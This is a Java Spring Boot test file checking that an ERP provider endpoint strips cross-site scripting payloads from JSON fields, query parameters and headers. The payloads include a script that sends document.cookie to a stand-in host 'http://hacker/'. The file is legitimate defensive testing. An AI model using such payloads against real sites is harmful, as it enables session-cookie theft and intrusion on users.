package net.erp.eveline.security;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.JsonNodeFactory;
import com.fasterxml.jackson.databind.node.ObjectNode;
import org.junit.jupiter.api.Test;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.web.server.LocalServerPort;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.web.client.RestTemplate;
import org.springframework.web.util.UriComponentsBuilder;

import java.io.IOException;

import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.http.HttpMethod.PUT;

@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
class XSSUnitTests {

    @LocalServerPort
    int randomServerPort;

    @Test
    public void givenRequestIsSuspicious_whenRequestIsPut_thenResponseIsClean()
            throws IOException {
        // given
        String upsertProviderUrl;
        RestTemplate restTemplate;
        HttpHeaders headers;
        UriComponentsBuilder builder;
        ObjectMapper objectMapper = new ObjectMapper();
        ObjectNode providerJsonObject = JsonNodeFactory.instance.objectNode();
        upsertProviderUrl = "http://localhost:" + randomServerPort + "/eveline-erp/provider/";
        restTemplate = new RestTemplate();
        headers = new HttpHeaders();

        // when
        providerJsonObject.put("id", "p00001");
        providerJsonObject.put("name", "provName <script>alert('XSS')</script>");
        providerJsonObject.put("description", "description <b onmouseover=alert('XSS')>click me!</b>");
        providerJsonObject.put("email", "test@test.com");
        providerJsonObject.put("telephone1", "11111111");
        providerJsonObject.put("lastUser", "tempUser");

        builder = UriComponentsBuilder.fromHttpUrl(upsertProviderUrl).queryParam("param", "<script>");

        headers.setContentType(MediaType.APPLICATION_JSON);
        headers.add("header_1", "<body onload=alert('XSS')>");
        headers.add("header_2", "<span onmousemove='doBadXss()'>");
        headers.add("header_3", "<SCRIPT>var+img=new+Image();img.src=\"http://hacker/\"%20+%20document.cookie;</SCRIPT>");
        headers.add("header_4", "<p>Your search for 'flowers <script>evil_script()</script>'");
        headers.add("header_5", "Hello header");
        HttpEntity<String> request = new HttpEntity<>(providerJsonObject.toString(), headers);

        ResponseEntity<String> personResultAsJsonStr = restTemplate.exchange(builder.toUriString(), PUT, request, String.class);
        JsonNode root = objectMapper.readTree(personResultAsJsonStr.getBody());

        // then
        assertThat(root.get("name").textValue()).isEqualTo("provName ");
        assertThat(root.get("description").textValue()).isEqualTo("description click me!");
//        NOTE: The following assertions will be used in case that there is a new endpoints that actually uses
//        a request header and a request param as part of the response. For the endpoint tested right now, we do not
//        need to assert any of the values.
//        assertThat(root.get("param").textValue()).isEmpty();
//        assertThat(root.get("header_1").textValue()).isEmpty();
//        assertThat(root.get("header_2").textValue()).isEmpty();
//        assertThat(root.get("header_3").textValue()).isEmpty();
//        assertThat(root.get("header_4").textValue()).isEqualTo("Your search for 'flowers '");
    }
}
